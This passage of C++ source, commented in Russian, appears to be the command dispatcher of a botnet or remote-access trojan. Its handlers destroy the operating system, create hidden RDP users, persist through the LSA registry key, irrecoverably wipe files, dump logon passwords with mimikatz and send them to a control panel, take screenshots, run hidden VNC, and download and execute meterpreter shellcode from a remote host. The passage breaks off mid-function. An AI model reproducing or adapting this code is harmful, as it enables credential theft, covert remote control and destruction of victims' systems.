	DbgMsg( "Выполнение команды httpproxy[%s](%s)", cmd.c_str(), args.c_str() );
	int port = args.ToInt();
	if( port > 0 )
	{
		ManagerServer::StartHttpProxy(port);
	}
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/********************************** команда killos ******************************************************************/
//делат ОС не загружаемой после ребута. После порчи ОС делается ребут. Параметров нет
void ExecCmd_KillOs( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды killos[%s](%s)", cmd.c_str(), args.c_str() );
	KillOs();
	Reboot();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/**************************************************** команда reboot ************************************************/
//перезагрурает компьютер. Параметры не нужны
void ExecCmd_Reboot( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды reboot[%s](%s)", cmd.c_str(), args.c_str() );
	Reboot();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/*********************************************** команда tunnel ***********************************************************/
//Создает различные туннели для передачи трафика от одного бота через другого
//формат команды: tunnel порт {server | http | ip:port}
//порт - номер порта которые открывается для подключения с другого бота
//server - трафик перенаправляется на бк сервер, с которым соединем данный бот
//http - создается http прокси, для доступа к админке
//ip:port - весь трафик перенаправляется на указанный адрес
//команда запоминается в настройках бота и будет действовать после ребута
void ExecCmd_Tunnel( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды tunnel[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split(' ');
	if( sa.Count() < 2 ) return;
	const char* pipeName = 0;
	StringBuilder& pp = sa[0];
	bool del = false;
	int port = 0;
	if( pp[0] == '-' )
	{
		pipeName = pp.c_str() + 1;
		port = -1;
	}
	else
		port = pp.ToInt();
	if( port == 0 ) return;

	if( sa.Count() == 3 )
		if( sa[2]->Hash() == 0x00006abc /*del*/ )
			del = true;

	StringBuilder& to = sa[1];
	uint toHash = to.Hash();
	bool remember = false; //true если команду нужно сохранить в конфиге
	if( toHash == 0x079c9cc2 /*server*/ )
	{
#ifdef ON_VIDEOSERVER
		if( !del )
			ManagerServer::StartVideoServerTunnel( port, pipeName );
		remember = true;
#endif
	}
	else if( toHash == 0x0006fbb0 /*http*/ )
	{
		ManagerServer::StartHttpProxy(port);
		remember = true;
	}
	else
	{
		AddressIpPort addr;
		if( addr.Parse(to) )
		{
			ManagerServer::StartIpPortProxy( port, addr );
			remember = true;
		}
	}
	if( remember )
	{
		if( sa.Count() == 3 )
		{
			if( port == -1 && del )
				PipeClient::Send( pipeName, PipeServer::CmdDisconnect, 0, 0 );
		}
		StringBuilderStack<32> cmd2( cmd.c_str(), cmd.Len() );
		cmd2 += ' ';
		cmd2.Cat(port);
		SaveCmdInConfigFile( cmd2, to, del );
	}
}

///////////////////////////////////////////////////////////////////////////////////////////////////////
// команда adminka - указывает через какой прокси сервер слать запросы
// формат: adminka {new | http | https | socks5} {ip:port | host} [del, proxy authorization]
// команда сохраняется в файле конфига, если есть несколько прокси, то для каждого команда дается отдельно
// если указан аргумент new, то идет смена хостов для админки, если их несколько, то нужно указывать через символ |
//////////////////////////////////////////////////////////////////////////////////////////////////////

void ExecCmd_Adminka( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды adminka[%s](%s)", cmd.c_str(), args.c_str() );
	int p1 = args.IndexOf(' ');
	if( p1 < 0 ) p1 = args.Len();
	uint hashType = Str::Hash( args.c_str(), p1 );
	Proxy::Info addr;
	bool newAdminka = false;
	switch( hashType )
	{
		case 0x0006fbb0: //http
			addr.type = Proxy::HTTP;
			break;
		case 0x006fbb73: //https
			addr.type = Proxy::HTTPS;
			break;
		case 0x07a5a265: //socks5
			addr.type = Proxy::SOCKS5;
			break;
		case 0x000074c7: //new
			newAdminka = true;
			break;
		default:
			return;
	}
	StringBuilder cmd2, args2;
	cmd2 = cmd;
	cmd2 += ' ';
	bool del = false;
	int p0 = p1;
	p1 = args.Ignore( p1, ' ' );
	if( newAdminka )
	{
		cmd2.Cat( args, p0 );
		args.Substring(args2, p1);
		if( args2.IsEmpty() ) del = true;
		ManagerServer::SetNewHostsAdminki(args2);
	}
	else
	{
		int p2 = args.IndexOf( p1, ' ' );
		if( p2 < 0 ) p2 = args.Len();
		char ipport[32];
		Str::Copy( ipport, sizeof(ipport), args.c_str() + p1, p2 - p1 );
		if( !addr.ipPort.Parse(ipport) ) return;
		cmd2.Cat( args.c_str(), p2 );
		p2 = args.Ignore( p2, ' ' );
		Str::Copy( addr.authentication, sizeof(addr.authentication), args.c_str() + p2, args.Len() - p2 );
		if( Str::Hash( addr.authentication ) == 0x00006abc /*del*/ )
		{
			del = true;
			ManagerServer::DelProxy( &addr, 1 );
		}
		else
			ManagerServer::SetProxy( &addr, 1 );
		args2 = addr.authentication;
	}
	SaveCmdInConfigFile( cmd2, args2, del );
}

/////////////////////////////////////////////////////////////////////////////////////////////
//команда server указывает по какому айпи нужно связываться с сервером
//формат server [force] ip:port [ip:port] [ip:port] ...
//если нужно подсоединиться к удаленному пайп каналу, то вместо ip:port нужно писать ip\pipe_name@user#password
//аргументы: force - бот сразу переключается на ip:port указанный первым, если force не указан, то перечисленные адреса
//			запоминаются и если с зашитимы серверами не удается соединится, то будут использоваться указанные в команде
//команда запоминается и после ребута будет выполнена автоматом
//////////////////////////////////////////////////////////////////////////////////////////////

void ExecCmd_Server( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды server[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split(' ');
	if( sa.Count() > 0 )
	{
		AddressIpPort addr[5];
		int c_addr = 0, n = 0;
		bool force = false;
		if( sa[n]->Hash() == 0x006d6895 /*force*/ )
		{
			force = true;
			n++;
		}
		for( ; n < sa.Count(); n++, c_addr++ )
		{
			StringBuilder& aa = sa[n];
			if( aa.IndexOf('\\') > 0 ) //конект через пайп
			{
				Str::Copy( addr[c_addr].ip, sizeof(addr[c_addr].ip), aa.c_str(), aa.Len() );
				addr[c_addr].port = -1;
			}
			else
				if( !addr[c_addr].Parse( aa.c_str() ) )
					break;
		}
		ManagerServer::AddVideoServers( force, addr, c_addr );
	}
	SaveCmdInConfigFile( cmd, args, args.IsEmpty() );
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/******************************************** команда user ******************************************************/
//создает или удаляет юзера с правами для RDP
//формат команды: user {create | delete} имя_юзера [пароль] [0 | 1]
//create - создание указанного юзера
//delete - удаление юзера
//пароль указывается только для создания юзера (create)
//[0 | 1] - при создании юзера, 1 - делать его не видимым, 0 - юзера будет видно
void ExecCmd_User( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды user[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split(' ');
	if( sa.Count() < 2 ) return;
	uint type = sa[0]->Hash();
	int err = TaskErr::Param;
	if( type == 0x06a8b8a5 /*create*/ )
	{
		if( sa.Count() >= 3 )
		{
			bool hidden = true;
			if( sa.Count() > 3 )
			{
				if( sa[3]->c_str()[0] == '0' ) hidden = false;
			}
			if( Users::AddRemoteUser( sa[1]->c_str(), sa[2]->c_str(), true, hidden ) )
				err = TaskErr::Succesfully;
			else
				err = TaskErr::Wrong;
		}
	}
	else if( type == 0x06ac2ca5 /*delete*/ )
	{
		if( Users::Delete( sa[1]->c_str() ) )
			err = TaskErr::Succesfully;
		else
			err = TaskErr::Wrong;
	}
	ManagerServer::SendResExecutedCmd( cmd, err );
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/********************************************* команда rdp ********************************************************/
//включает на данном компе rdp, причем текущий юзер не отключается и можно подключаться нескольким одинаковым юзерам
//формат команды rdp {file | mem}
//file - делает правки в системных файла на диске, в результате и после ребута рдп будет включено
//mem - правки делаются только в памяти
void ExecCmd_RDP( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды rdp[%s](%s)", cmd.c_str(), args.c_str() );
	uint argHash = args.Hash();
	int err = TaskErr::Param;
	if( argHash == 0x0006d025 /*file*/ )
	{
		if( PatchRDPFiles() )
		{
			DbgMsg( "Файловый rdp патч установлен" );
			err = TaskErr::Succesfully;
		}
		else
		{
			DbgMsg( "Файловый rdp патч не установлен" );
			err = TaskErr::Wrong;
		}
	}
	else if( argHash == 0x000073bd /*mem*/ )
	{
	}
	ManagerServer::SendResExecutedCmd( cmd, err );
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//закрепляет бота в секретном месте
//secure lsa имя_плагина - загружает и прописывает dll бота в HKLM\\System\\CurrentControlSet\\Control\\Lsa -v "Notification Packages"
//если после имени плагина указать notdel, то текущий бот не будет удаляться

struct SecureParam
{
	Secure::typeSecureFunc func;
	bool notdel;
};

static void HandlerSecurePlugin( Pipe::AutoMsg msg, DWORD tag )
{
	if( msg->sz_data == 0 ) return;
	DbgMsg( "Загружен плагин для секретной установки %08x %08x", tag, msg->tag );
	SecureParam* param = (SecureParam*)tag;
	Mem::Data data;
	UnprotectBot();
	data.Link( msg->data, msg->sz_data );
	bool res = false;
	StringBuilderStack<MAX_PATH> folderBot;
	Config::GetBotFolder(folderBot);
	if( param->func( data, folderBot ) )
	{
		DbgMsg( "Установка dll завершилась успешно" );
		res = true;
	}
	else
		DbgMsg( "DLL не удалось установить" );
	ProtectBot();
	data.Unlink();
	//добавляем команду для удаления текущего бота
	if( res && !param->notdel )
	{
		StringBuilder delCmd;
		delCmd = _CS_("del ");
		if( Config::state & IS_SERVICE )
		{
			delCmd += _CS_("service ");
			delCmd += Config::nameService;
		}
		else
		{
			delCmd += _CS_("file ");
			delCmd += Config::fileNameBot;
		}
		Task::AddStartCmd(delCmd);
	}
	Mem::Free(param);
}

void ExecCmd_Secure( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды secure[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split(' ');
	if( sa.Count() < 2 ) return;
	uint arg = sa[0]->Hash();
	SecureParam* param = (SecureParam*)Mem::Alloc( sizeof(SecureParam) );
	Mem::Set( param, 0, sizeof(SecureParam) );
	Pipe::typeReceiverPipeAnswer handler = 0;
	if( arg == 0x00007391 /*lsa*/ )
	{
		param->func = Secure::Lsa;
		handler = HandlerSecurePlugin;
	}
	if( sa.Count() >= 3 )
	{
		uint arg3 = sa[2]->Hash();
		if( arg3 == 0x0756aabc ) param->notdel = true;
	}
	if( handler )
	{
		ManagerServer::LoadPlugin( *sa[1], handler, 0, (DWORD)param );
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/****************************************** команда del **********************************************/
//удаляет указанный сервис или файл, при этом в сам файл пишутся 0xff чтобы его было невозможно восстановить
//формат команды: del {service | file} {имя сервиса | имя файла}
//service - удаляет указанный сервис
//file - удаляет указанный файл
void ExecCmd_Del( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды del[%s](%s)", cmd.c_str(), args.c_str() );
	int p = args.IndexOf(' ');
	if( p > 0 ) 
	{
		uint param = Str::Hash( args.c_str(), p );
		StringBuilder name( 0, -1, args.c_str() + p + 1 );
		if( param == 0x09c9cfe5 /*service*/ )
		{
			if( Str::Cmp( Config::nameService, name ) != 0 ) //защита от удаления самого себя
			{
				for( int i = 0; i < 10; i++ )
				{
					if( Service::DeleteWithFile(name) )
					{
						DbgMsg("Сервис %s удален успешно", name.c_str() );
						break;
					}
					else
						DbgMsg("Сервис %s удалить не удалось", name.c_str() );
					Delay(1000);
				}
			}
		}
		else if( param == 0x0006d025 /*file*/ )
		{
			if( Str::Cmp( Config::fileNameBot, name ) != 0 ) //защита от удаления самого себя
			{
				for( int i = 0; i < 10; i++ )
				{
					if( File::DeleteHard(name) ) 
					{
						DbgMsg("Файл %s удален успешно", name.c_str() );
						break;
					}
					else
						DbgMsg("Файл %s удалить не удалось", name.c_str() );
					Delay(1000);
				}
			}
		}
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
/******************************************** команда startcmd ***********************************************/
//сохраняет указанную в аргументах команду в настройках бота и эта команда будет выполнится после ребута
//формат команды: startcmd любая команда с аргументами
void ExecCmd_StartCmd( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды startcmd[%s](%s)", cmd.c_str(), args.c_str() );
	Task::AddStartCmd(args);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

static void HandlerRunMemLoadFile( Pipe::AutoMsg msg, DWORD tag )
{
	if( msg->sz_data == 0 ) 
	{
		DbgMsg( "Для команды runmem файл не удалось загрузить" );
		return;
	}
	DbgMsg("Для команды runmem файл успешно загружен");
	char* nameUser = (char*)tag;
	Sandbox::RunMem( msg->data, msg->sz_data, nameUser );
}
/******************************************** команда runmem ************************************************/
//загружает файл по урлу или по имени плагина и запускает его в памяти
//формат команды: runmem [user$ИмяЮзера] {url | имя плагина}
//если указан аргумент user, то файл запускается от имени текущего юзера, если бот запущен с систенмными правами
void ExecCmd_RunMem( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды runmem[%s](%s)", cmd.c_str(), args.c_str() );
	char* nameUser = GetUserFromCmd(args);
	if( args.IndexOf(':') > 0 ) //указан урл
		ManagerServer::LoadFile( args, HandlerRunMemLoadFile, 0, (DWORD)nameUser );
	else
		ManagerServer::LoadPlugin( args, HandlerRunMemLoadFile, 0, (DWORD)nameUser );
}

/********************************************* команда logonpasswords *********************************************/
//снимает логины и пароли используя библиотеку mimikatz, результат отсылается в админку или бк сервер
//формат команды: logonpasswords {server | adminka}
//server - данные отсылаются на бк сервер в папку mimikatz/logon_passwords
//adminka - данные отсылаются в админку под файлом logon_passwors
#ifdef ON_MIMIKATZ
void ExecCmd_LogonPasswords( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды logonpasswords[%s](%s)", cmd.c_str(), args.c_str() );
	args.Lower();
	uint hashArg = args.Hash();
	StringBuilder s;
	if( mimikatz::GetLogonPasswords(s) )
	{
		if( args.IsEmpty() || hashArg == 0x079c9cc2 /*server*/ )
		{
			ManagerServer::SendFileToVideoServer( _CS_("mimikatz"), _CS_("logon_passwords"), _CS_("txt"), s );
		}
		else if( hashArg ==  0x07b40571 /*adminka*/ ) //в админку
		{
			ManagerServer::SendData( _CS_("logon_passwords"), s.c_str(), s.Len(), false );
		}
	}
}
#endif

/************************************************ команда screenshot ***********************************************/
//формат команды: screenshot [user$ИмяЮзера] [server|adminka]
//делает скриншот экрана указанного юзера и отсылает его в админку или на сервер в папку screenshots/full_screen
//если не указано куда слать, то по умолчанию шлется в админку

static DWORD WINAPI ScreenshotFunc( void* )
{
	char* args = (char*)Sandbox::Init();
	uint hash = Str::Hash(args);
	Mem::Data data;
	Screenshot::Init();
	Screenshot::MakePng( HWND_DESKTOP, data );
	if( hash == 0x079c9cc2 /*server*/ )
		ManagerServer::SendFileToVideoServer( _CS_("screenshots"), _CS_("full_screen"), _CS_("png"), data );
	else
		ManagerServer::SendData( _CS_("screenshot"), data.Ptr(), data.Len(), true, _CS_("full_screen.png") );
	Mem::Free(args);
	Screenshot::Release();
	return 0;
}

void ExecCmd_Screenshot( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды screenshot[%s](%s)", cmd.c_str(), args.c_str() );
	args.Lower();
	char* nameUser = GetUserFromCmd(args);
	Sandbox::Run( ScreenshotFunc, nameUser, args.c_str(), args.Len() + 1, false );
	if( nameUser != MAIN_USER ) Str::Free(nameUser);
}

void ExecCmd_Sleep( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды sleep[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split('.');
	if( sa.Count() != 3 ) return;
	Config::StruSleep date;
	date.day = sa[0]->ToInt();
	date.month = sa[1]->ToInt();
	date.year = sa[2]->ToInt();
	if( date.day > 0 && date.day <= 31 && date.month > 0 && date.month <= 12 && date.year < 2050 )
	{
		StringBuilderStack<MAX_PATH> fileName;
		if( Config::GetSleepingFileName(fileName) )
		{
			DbgMsg( "Бот переходит в режим сна до %02d.%02d.%04d, сохранили в файле %s", (int)date.day, (int)date.month, (int)date.year, fileName.c_str() );
			File::WriteAll( fileName, &date, sizeof(date) );
		}
	}
}

/************************************** команда dupl *********************************************/
//формат команды: dupl {keylogger | screenshot} [stop | file | server | file_server]
//дублирует данные отсылаемые в админку в файлах папки бота или отсылает на сервер (по умолчанию действует file)
//keylogger - дублирование файлов кейлогера
//screenshot - дублирование файло скриншотов
//stop - если указан, то останавливает дублирование
void ExecCmd_Dupl( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды dupl[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split(' ');
	if( sa.Count() == 0 ) return;
	uint hash = sa[0]->Hash();
	bool stop = false;
	int dst = 0, err = 0;
	if( sa.Count() > 1 )
	{
		uint hash1 = sa[1]->Hash();
		if( hash1 == 0x0007ab60 /*stop*/ )
			stop = true;
		else if( hash1 == 0x0006d025 /*file*/ )
			dst |= 1;
		else if( hash1 == 0x079c9cc2 /*server*/ )
			dst |= 2;
		else if( hash1 == 0x06f19e72 /*file_server*/ )
			dst |= 3;
		else
			err = 1; //неверный аргумент
	}
	else
		dst = 1; //по умолчанию шлются в файл
	if( err == 0 )
	{
		ManagerServer::DuplData( hash, dst );
		//сохранение в конфиг файле
		StringBuilderStack<64> cmd2( cmd.c_str(), cmd.Len() );
		StringBuilder args2;
		cmd2 += ' ';
		cmd2 += *sa[0];
		if( !stop && sa.Count() > 1 )
		{
			args2 += *sa[1];
		}
		SaveCmdInConfigFile( cmd2, args2, stop );
	}
}

/************************************** команда findfiles *********************************************/
//формат команды: findfiles path mask {adminka|server|adminka_server} name
//поиск файлов по маске mask в папке path, найденные файлы сжимаются кабом и полученный архив отсылается 
//под именем name (в имени расширение указывать не обязательно)
//маска должна содержать только возможные символы для файла, не должно быть знака *, маска это подстрока 
void ExecCmd_FindFiles( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды findfiles[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split(' ');
	if( sa.Count() != 4 ) return;
	uint dstHash = sa[2]->Hash(); //куда отправлять результат
	int dst = 0;
	switch( dstHash )
	{
		case 0x07b40571: dst |= 1; break; //adminka
		case 0x079c9cc2: dst |= 2; break; //server
		case 0x0ddccbe2: dst |= 3; break; //adminka_server
	}
	if( dst == 0 ) return;
	int countFiles = FindFiles( *sa[0], *sa[1], dst, *sa[3] );
	DbgMsg( "В папке %s по маске %s найдено %d файлов", sa[0]->c_str(), sa[1]->c_str(), countFiles );
}

/************************************** команда vnc *********************************************/
//формат команды: vnc [hidden] {port | stop}
//если указан hidden, то запускает скрытую сессию vnc (юзер ее не видит), иначе запускается обычное vnc которые работает на рабочем столе клиента (юзер ее видит)
//загружает с админки плагин vnc.plug и запускает vnc сессию по указанному порту port
//если указан аргумент stop, то vnc сессия закрывается (отключение vnc)
void ExecCmd_VNC( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды vnc[%s](%s)", cmd.c_str(), args.c_str() );
	if( args.Len() <= 2 ) return;
	StringArray sa = args.Split(' ');
	bool hvnc = false;
	int n = 0;
	uint argHash = sa[0]->Hash();
	StringBuilderStack<32> nameVNCServer;
	VNC::GetNameVNCServer(nameVNCServer);
	if( argHash == 0x0007ab60 /*stop*/ ) 
	{
		PipeClient::Send( nameVNCServer, PipeServer::CmdDisconnect, 0, 0 );
		n++;
	}
	else if( argHash == 0x0006fd43 /*hvnc*/ )
	{
		hvnc = true;
		n++;
	}
	if( n < sa.Count() )
	{
		AddressIpPort ipp;
		if( sa[n]->IndexOf(':') > 0 )
			ipp.Parse(args);
		else
		{
			ipp.ip[0] = 0;
			ipp.port = sa[n]->ToInt();
		}
		if( ipp.port > 0 && ipp.port < 65536 )	{
			if( PipeClient::Send( nameVNCServer, PipeServer::CmdDisconnect, 0, 0 ) ) //отключаем уже запущенную сессию (если есть)
				Delay(2000);
			VNC::StartDefault( ipp, hvnc );
		}
	}
}

/************************************** команда runfile *********************************************/
//формат команды: runfile [user$ИмяЮзера] {путь к файлу}
//запускает указанный файл, находящийся на локальной машине где запущен бот
//если указан аргумент user, то если бот запущен под системой, то файл будет запущен под текущем юзером
//если указано ИмяЮзера, то файл будет запущен от имени указанного юзера
void ExecCmd_RunFile( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды runfile[%s](%s)", cmd.c_str(), args.c_str() );
	char* nameUser = GetUserFromCmd(args);
	Sandbox::Exec(args, 0, nameUser);
	if( nameUser != MAIN_USER ) Str::Free(nameUser);
}

/************************************** команда killbot *********************************************/
//формат команды: killbot
//самоуничтожение бота, удаляется все файлы принадлежащие боту и завершает свою работу
void ExecCmd_KillBot( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды killbot[%s](%s)", cmd.c_str(), args.c_str() );
	UnprotectBot();
	UnprotectConfig();
	File::DeleteHard(Config::fileNameBot);
	DbgMsg( "Удалили файл бота %s", Config::fileNameBot );
	File::DeleteHard(Config::fileNameConfig);
	DbgMsg( "Удалили файл конфига %s", Config::fileNameConfig );
	if( Config::state & IS_SERVICE )
	{
		Service::Delete(Config::nameService);
		DbgMsg( "Удалили сервис %s", Config::nameService );
	}
	StringBuilderStack<MAX_PATH> fileName;
	Service::GetFileNameService(fileName);
	File::DeleteHard(fileName);
	DbgMsg( "Удалили файл бота который возможно был скопирован для сервиса %s", fileName.c_str() );
	//завершаем работу бота
	PipeClient::Send( Config::nameManager, PipeServer::CmdDisconnect, 0, 0 );
}

/************************************** команда listprocess *********************************************/
//формат команды: listprocess {adminka|server|adminka_server}
//отсылает список процессов в админку или сервер
void ExecCmd_ListProcess( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды listprocess[%s](%s)", cmd.c_str(), args.c_str() );
	uint dstHash = args.Hash(); //куда отправлять результат
	int dst = 0;
	if( args.IsEmpty() )
		dst = 1;
	else
		switch( dstHash )
		{
			case 0x07b40571: dst |= 1; break; //adminka
			case 0x079c9cc2: dst |= 2; break; //server
			case 0x0ddccbe2: dst |= 3; break; //adminka_server
		}
	SendListProcess(dst);
}

/*************************************** команда plugins *************************************************/
//формат команды: plugins {adminka|server}
//указывает откуда качать плагины
void ExecCmd_Plugins( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды plugins[%s](%s)", cmd.c_str(), args.c_str() );
	uint hash = args.Hash();
	char c = 0;
	switch( hash )
	{
		case 0x07b40571: c = '0'; break; //adminka
		case 0x079c9cc2: c = '1'; break; //server
	}
	if( c )
		ManagerServer::SetGlobalState( Task::GlobalState_Plugin, c );
}

/*************************************** команда tinymet *************************************************/
//формат команды: tinymet {ip:port | name_plugin} [name_plugin]
//качает meterpreter с указанного адреса и запускает в памяти

DWORD WINAPI TinyMetThread( void* )
{
	int sz_data;
	byte* data = (byte*)Sandbox::Init( &sz_data );
	int sz_addr = *((int*)data);
	int sz_body = *((int*)(data + sizeof(int) + sz_addr));
	void* body = 0;
	int sc = 0;
	Mem::Data data2;
	if( sz_addr > 0 ) //передан ip адрес
	{
		AddressIpPort* addr = (AddressIpPort*)(data + sizeof(int));
		if( Socket::Init() )
		{
			DbgMsg( "Пытаемся грузить метер с %s:%d", addr->ip, addr->port );
			sc = Socket::ConnectIP( addr->ip, addr->port );
			if( sc > 0 )
			{
				if( sz_body == 0 )
				{
					char buf[4];
					if( Socket::Read( sc, buf, sizeof(buf), 30000 ) == sizeof(buf) )
					{
						int size = *((int*)buf);
						DbgMsg( "Для TinyMet получили размер %d", size );
						if( size > 0 && size < 4 * 1024 * 1024 )
						{
							if( data2.MakeEnough(size) )
							{
								if( Socket::Read( sc, data2, size, 5000 ) == 1 )
								{
									body = data2.Ptr();
									sz_body = data2.Len();
									for( int i = 0; i < sz_body; i++ )
										((byte*)body)[i] ^= 0x50;
								}
							}
						}
					}
					else
						DbgMsg( "Для TinyMet не считался размер" );
				}
				else
				{
					body = data + sizeof(int) + sz_addr + sizeof(int);
				}
			}
			else
				DbgMsg( "Нет данных для TinyMet" );
		}
	}
	else
	{
		body = data + sizeof(int) + sizeof(int);;
	}

	if( body )
	{
		byte* mem = (byte*)API(KERNEL32, VirtualAlloc)( 0, sz_body + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
		if( mem )
		{
			if( sc )
			{
				mem[0] = 0xbf; // opcode of "mov edi, [WhateverFollows]
				Mem::Copy( mem + 1, &sc, 4 );
				Mem::Copy( mem + 5, body, sz_body );
			}
			else
			{
				Mem::Copy( mem, body, sz_body );
			}
			DbgMsg( "Запустили metepreter" );
			(*(void(*)())mem)();
		}
	}
	Mem::Free(data);
	return 0;
}

static void TinyMetStart( void* addr, void* met, int sz_met )
{
	Mem::Data data( sizeof(int) + sizeof(AddressIpPort) + sizeof(int) + sz_met );
	int sz_addr = addr ? sizeof(AddressIpPort) : 0;
	data.Append( &sz_addr, sizeof(sz_addr) );
	data.Append( addr, sz_addr );
	data.Append( &sz_met, sizeof(sz_met) );
	data.Append( met, sz_met );
	Sandbox::Run( TinyMetThread, 0, data.Ptr(), data.Len(), false );
	Mem::Free(addr);
}

static void TinyMetLoadedPlugin( Pipe::AutoMsg msg, DWORD tag )
{
	if( msg->sz_data == 0 )
	{
		DbgMsg( "Плагин для tinymet не загружен" );
		return;
	}
	DbgMsg( "Загрузили плагин для tinymet" );
	TinyMetStart( (void*)tag, msg->data, msg->sz_data );
}

void ExecCmd_TinyMet( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды tinymet[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split(' ');
	if( sa.Count() > 0 ) 
	{
		AddressIpPort addr;
		if( addr.Parse(*sa[0]) )
		{
			void* addr2 = Mem::Duplication( &addr, sizeof(addr) );
			if( sa.Count() > 1 ) //указан плагин который нужно качать
			{
				ManagerServer::LoadPlugin( *sa[1], TinyMetLoadedPlugin, 0, (DWORD)addr2 );
			}
			else
				TinyMetStart( addr2, 0, 0 );
		}
		else //передали только имя плагина
			ManagerServer::LoadPlugin( *sa[0], TinyMetLoadedPlugin );
	}
}

/*************************************** команда killprocess *************************************************/
//формат команды: killprocess имя_процесса
//уничтожает процесс по его имени

void ExecCmd_KillProcess( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды killprocess[%s](%s)", cmd.c_str(), args.c_str() );
	int err = TaskErr::Param;
	if( !args.IsEmpty() )
	{
		if( Process::Kill( args, 5000 ) )
			err = TaskErr::Succesfully;
		else
			err = TaskErr::Wrong;
	}
	ManagerServer::SendResExecutedCmd( cmd, err );
}

/*************************************** команда cmd *************************************************/
//служебная команда, дается видеосервером для запуска cmd.exe

void ExecCmd_Cmd( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды cmd[%s](%s)", cmd.c_str(), args.c_str() );
	char* nameUser = GetUserFromCmd(args);
	WinCmd::Start(nameUser);
	if( nameUser != MAIN_USER ) Str::Free(nameUser);
}

/*************************************** команда runplug *************************************************/
//формат команды runplug name-plugin [cbtext name-func name-data] [wait] [autorun] [start name-func] [stop [name-func]] [func name-func [args]]
//запускает плагин, который является dll файлом
//cbtext - плагину посредством экспортной функции name-func передается колбек функция и получаемые текстовые данные отсылаются на бк сервер под именем name-data
//wait - после запуска плагина ожидать, если не указать и не указано колбек функции, то плагин запустится и процесс сразу завершиться после завершения работы плагина
//autorun - установить автозапуск плагина
//start - какую экспортную функцию запустить при старте, функции передаются args, если указаны
//stop - остановить плагин вызвав функцию name-func (если был автозапуск, то и убирается с автозапуска)
//func - вызвать экспортную функцию name-func плагина с необязательными параметрами args

void ExecCmd_RunPlug( StringBuilder& cmd, StringBuilder& args )
{
	DbgMsg( "Выполнение команды runplug[%s](%s)", cmd.c_str(), args.c_str() );
	StringArray sa = args.Split(' ');
	if( sa.Count() == 0 ) return;
	Plugin::PluginStru plg;
	Mem::Zero(plg);
	Str::Copy( plg.name, sizeof(plg.name), sa[0]->c_str() );
	int n = 1;
	int err = 0;
	bool autorun = false;
	bool stop = false;
	char stop_func[32];
	while( n < sa.Count() && !err )
	{
		uint hash = sa[n]->Hash();
		switch( hash )
		{
			case 0x0699acf4: //cbtext
				if( n + 2 < sa.Count() )
				{
					plg.cbtype = Plugin::PluginCBText;
					Str::Copy( plg.name_func, sizeof(plg.name_func), sa[n + 1]->c_str() );
					Str::Copy( plg.name_data, sizeof(plg.name_data), sa[n + 2]->c_str() );
					n += 3;
				}
				else
					err = TaskErr::Param;
				break;
			case 0x08cb69de: //autorun
				autorun = true;
				n++;
				break;
			case 0x007aa894: //start
				if( n + 1 < sa.Count() )
				{
					n++;
					Str::Copy( plg.func_start, sizeof(plg.func_start), sa[n]->c_str() );
				}
				n++;
				break;
			case 0x0007ab60: //stop
				stop = true;
				stop_func[0] = 0;
				if( n + 1 < sa.Count() )
				{
					n++;
					Str::Copy( stop_func, sizeof(stop_func), sa[n]->c_str() );
				}
				n++;
				break;
			case 0x0007d804: //wait
				if( plg.cbtype == 0 )
					plg.cbtype = Plugin::PluginWait;
				n++;
				break;
			case 0x0006dc43: //func
				if( n + 1 < sa.Count() )
				{
					Plugin::ExecuteFunc( plg.name, sa[n + 1]->c_str(), 0 ); //пока не реализован вызов параметров
					n = sa.Count();
				}
				break;
			default:
				err = TaskErr::Param;
		}
	}
	if( !err )
	{
		if( autorun || stop )
		{
			StringBuilder cmd2, args2;
			cmd2 = cmd;
			cmd2 += ' ';
			cmd2 += *sa[0];
			for( int i = 1; i < sa.Count(); i++ )
			{
